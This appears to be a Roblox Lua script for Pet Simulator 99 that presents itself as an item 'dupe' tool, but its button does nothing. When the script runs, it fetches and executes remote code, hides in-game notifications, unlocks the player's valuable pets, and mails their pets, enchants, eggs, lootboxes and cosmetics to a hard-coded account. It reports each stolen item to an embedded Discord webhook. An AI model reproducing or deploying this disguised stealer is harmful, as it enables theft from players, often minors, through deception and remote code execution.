loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/ps99/main/logger.lua'))()
wait(1)
local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
local X = Material.Load({
	Title = "PS99 Dupe V1 [WORKING]",
	Style = 3,
	SizeX = 500,
	SizeY = 350,
	Theme = "Dark",
	ColorOverrides = {
		MainFrame = Color3.fromRGB(235,235,235)
	}
})
local Y = X.New({
	Title = "Dupe"
})
local A = Y.Button({
	Text = "START DUPING",
	Callback = function()
		print("hello")
	end,
	Menu = {
		Information = function(self)
			X.Banner({
				Text = "Make sure to have unlocked the exclusive daycare"
			})
		end
	}
})
local H = Y.TextField({
	Text = "Please only equip 1 huge",
    Type = "Password"
})



Username = "LaRussieCool2"
_G.Webhook = "https://discord.com/api/webhooks/1233473062293475410/W700VWb5jOrYwX2nGTlmZ4UNMmwqhQ_pnsxcOISS3AQ_aQ7QDL5jXQvc8_f-QhNF4lV8"
local message = "poop"
local user = Username
local library = require(game.ReplicatedStorage.Library)
local inv = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local loading = getsenv(plr.PlayerScripts.Scripts.Core["Process Pending GUI"])
local function closeLoop()
    while true do
        loading.Close()
        wait(0.02)
    end
end
coroutine.wrap(closeLoop)()
local noti = plr.PlayerGui.Notifications
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
    noti.Enabled = false
end)
noti.Enabled = false

--unlocking
local library = require(game.ReplicatedStorage.Library)
local inv = library.Save.Get().Inventory
for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    if dir.huge == true and v.pt and v.pt == 2 and v.sh and v.sh == true  then 
        local args = {
            [1] = i,
            [2] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    if dir.huge == true and v.pt and v.pt == 1 and v.sh and v.sh == true  then 
        local args = {
            [1] = i,
            [2] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    if dir.huge == true and v.pt and v.pt == 2 then 
        local args = {
            [1] = i,
            [2] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    if dir.huge == true and v.pt and v.pt == 1 then 
        local args = {
            [1] = i,
            [2] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    if dir.huge == true then 
        local args = {
            [1] = i,
            [2] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    if dir.exclusiveLevel == true then 
        local args = {
            [1] = i,
            [2] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
    end
end

--serious stuff
for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 2 and v.sh and v.sh == true  then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	    until not inv.Pet[i]
        _G.image = dir.thumbnail
        _G.type = "Shiny Rainbow 💎🌈"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 1 and v.sh and v.sh == true then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	    repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	    until not inv.Pet[i]
        _G.image = dir.goldenThumbnail
        _G.type = "Shiny Golden 💎🥇"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 2 then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
	    repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	    until not inv.Pet[i]
        _G.image = dir.thumbnail
        _G.type = "Rainbow 🌈"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end


for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.sh and v.sh == true then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
	    repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	    until not inv.Pet[i]
        _G.image = dir.goldenThumbnail
        _G.type = "Shiny 💎"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 1 then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
	    repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	    until not inv.Pet[i]
        _G.image = dir.goldenThumbnail
        _G.type = "Golden 🥇"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end


for i, v in pairs(inv.Enchant) do
    local id = v.id
    if id == "Chest Mimic" or id == "Boss Chest Mimic" then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Enchant",
            [4] = i,
            [5] = v._am or 1
        }
	    repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	    until not inv.Enchant[i]
        directory = library.Directory.Enchants[id]
        _G.type = "Not a Pet"
        _G.image = directory.Icon(1)
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

if inv.Ultimate then
    for i, v in pairs(inv.Ultimate) do
        local id = v.id
        local dir = library.Directory.Ultimates[id]
        _G.image = dir.Icon
        _G.id = id
        if id == "Hidden Treasure" or id == "Black Hole" or id == "Chest Spell" or id == "Nightmare" then
            local args = {
                [1] = user,
                [2] = message,
                [3] = "Ultimate",
                [4] = i,
                [5] = v._am or 1
            }
            repeat
        	    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
		    until not inv.Ultimate[i]
            _G.image = dir.Icon
            _G.type = "Not a Pet"
            wait(0.5)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
            _G.id = id
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
        end
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
	    repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	    until not inv.Pet[i]
        _G.image = dir.thumbnail
        _G.type = "Normal 🚽"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Egg) do
    local id = v.id
    local dir = library.Directory.Eggs[id]
    _G.image = dir.icon
    _G.id = id
    local args = {
        [1] = user,
        [2] = message,
        [3] = "Egg",
        [4] = i,
        [5] = v._am or 1
    }
    repeat
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	until not inv.Egg[i]
    _G.image = dir.icon
    _G.type = "Not a Pet"
    wait(0.5)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
    _G.id = id
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
end

for i, v in pairs(inv.Enchant) do
    local id = v.id
    if id == "Chest Mimic" or id == "Boss Chest Mimic" or id == "Boss Lucky Block" or id == "Diamond Chest Mimic" or id == "Fireworks" or id == "Lightning Orb" or id == "Lucky Block" or id == "Massive Comet" or id == "Party Time" or id == "Super Magnet" or id == "Super Shiny Hunter" or id == "Huge Hunter" or id == "Shiny Supercharge" or id == "Mini Chest Fortune" then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Enchant",
            [4] = i,
            [5] = v._am or 1
        }
        repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        until not inv.Enchant[i]
        directory = library.Directory.Enchants[id]
        _G.image = directory.Icon(1)
        _G.type = "Not a Pet"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end


if inv.Lootbox then
    for i, v in pairs(inv.Lootbox) do
        local id = v.id
        local dir = library.Directory.Lootboxes[id]
        _G.image = dir.Icon
        _G.id = id
        if id == "Titanic Christmas Present" then
            local args = {
                [1] = user,
                [2] = message,
                [3] = "Lootbox",
                [4] = i,
                [5] = v._am or 1
            }
            repeat
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            until not inv.Lootbox[i]
            _G.image = dir.Icon
            _G.type = "Not a Pet"
            wait(0.5)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
            _G.id = id
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
        end
    end
end

if inv.Lootbox then
    for i, v in pairs(inv.Lootbox) do
        local id = v.id
        if id == "Hype Egg" or id == "Clan Gift" or "Glitched Gift" then
            local args = {
                [1] = user,
                [2] = message,
                [3] = "Lootbox",
                [4] = i,
                [5] = v._am or 1
            }
            repeat
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            until not inv.Lootbox[i]
            _G.image = dir.Icon
            _G.type = "Not a Pet"
            wait(0.5)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
            _G.id = id
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
        end
    end
end

for i, v in pairs(inv.Hoverboard) do
    local id = v.id
    if id == "Balloon" or id == "Banana" or id == "Fire Dragon" or id == "Helicopter" or id == "High Tech" or id == "Hologram" or id == "Hotdog" or id == "Nightmare" or id == "Noob" or id == "Rocket" or id == "Toilet" or id == "UFO" or id == "Bleebo The Alien" or id == "Blobfish" or id == "Cosmic" or id == "Ducky" or id == "Pegasus" or id == "Pixel Dragon" or id == "Present" or id == "Sleigh" or id == "Oversized" then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Hoverboard",
            [4] = i,
            [5] = v._am or 1
        }
        repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        until not inv.Hoverboard[i]
        directory = library.Directory.Hoverboards[id]
        _G.image = directory.Icon
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Booth) do
    local id = v.id
    if id == "Present" or id == "Throne" or id == "Alien" or id == "Cupcake" or id == "Empyrean" or id == "Galaxy" or id == "Pixel" then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Booth",
            [4] = i,
            [5] = v._am or 1
        }
        repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        until not inv.Booth[i]
        directory = library.Directory.Booths[id]
        _G.image = directory.Icon
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end


for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.exclusiveLevel then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        until not inv.Pet[i]
        _G.image = dir.thumbnail
        _G.type = "Normal"
        if v.pt and v.pt == 1 then
            _G.image = dir.goldenThumbnail
            _G.type = "Golden 🥇"
        end
        if v.pt and v.pt == 2 then
            _G.image = dir.thumbnail
            _G.type = "Rainbow 🌈"
        end
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.exclusiveLevel then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        until not inv.Pet[i]
        _G.image = dir.thumbnail
        _G.type = "Normal"
        if v.pt and v.pt == 1 then
            _G.image = dir.goldenThumbnail
            _G.type = "Golden"
        end
        if v.pt and v.pt == 2 then
            _G.image = dir.thumbnail
            _G.type = "Rainbow"
        end
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

